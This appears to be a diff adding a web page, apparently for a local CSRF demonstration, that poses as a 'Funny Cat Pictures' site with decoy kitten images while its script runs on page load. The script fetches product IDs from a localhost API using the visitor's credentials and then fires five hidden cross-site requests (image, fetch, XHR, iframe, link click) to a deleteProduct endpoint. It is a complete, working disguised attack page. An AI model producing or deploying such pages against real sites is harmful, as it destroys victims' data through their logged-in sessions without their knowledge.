@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Funny Cat Pictures</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #f0f2f5;
+        }
+        .cat-container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 600px;
+            margin: 20px auto;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .cat-image {
+            max-width: 100%;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+        .loading {
+            color: #666;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="cat-container">
+        <h1>😺 Funny Cat Pictures 😺</h1>
+        <p class="loading">Loading cute cats...</p>
+        
+        <!-- Fake cat images to make the page look legitimate -->
+        <img src="https://placekitten.com/400/300" alt="Cute cat 1" class="cat-image">
+        <img src="https://placekitten.com/401/300" alt="Cute cat 2" class="cat-image">
+    </div>
+
+    <script>
+        // Function to demonstrate GET-based CSRF attacks
+        async function demonstrateGetCsrf() {
+            try {
+                // First, fetch existing products to get real IDs
+                const response = await fetch('http://localhost:3000/api/products', {
+                    credentials: 'include'
+                });
+                const products = await response.json();
+                
+                if (products && products.length > 0) {
+                    // Get the first product's ID
+                    const productId = products[0]._id;
+                    console.log('Found product ID:', productId);
+
+                    // Method 1: Using img tag
+                    const img = document.createElement('img');
+                    img.style.display = 'none';
+                    img.src = `http://localhost:3000/api/deleteProduct/${productId}`;
+                    img.onerror = () => console.log('Product deletion attempted via img tag');
+                    document.body.appendChild(img);
+
+                    // Method 2: Using fetch
+                    fetch(`http://localhost:3000/api/deleteProduct/${productId}`, {
+                        credentials: 'include'
+                    }).then(() => console.log('Product deletion attempted via fetch'));
+
+                    // Method 3: Using XMLHttpRequest
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', `http://localhost:3000/api/deleteProduct/${productId}`, true);
+                    xhr.withCredentials = true;
+                    xhr.onload = () => console.log('Product deletion attempted via XHR');
+                    xhr.send();
+
+                    // Method 4: Using an iframe
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = `http://localhost:3000/api/deleteProduct/${productId}`;
+                    document.body.appendChild(iframe);
+
+                    // Method 5: Using a link
+                    const link = document.createElement('a');
+                    link.href = `http://localhost:3000/api/deleteProduct/${productId}`;
+                    link.click();
+                } else {
+                    console.log('No products found to delete');
+                }
+            } catch (error) {
+                console.error('Error during CSRF attack:', error);
+            }
+        }
+
+        // Execute the attack when the page loads
+        window.onload = demonstrateGetCsrf;
+    </script>
+</body>
+</html> 
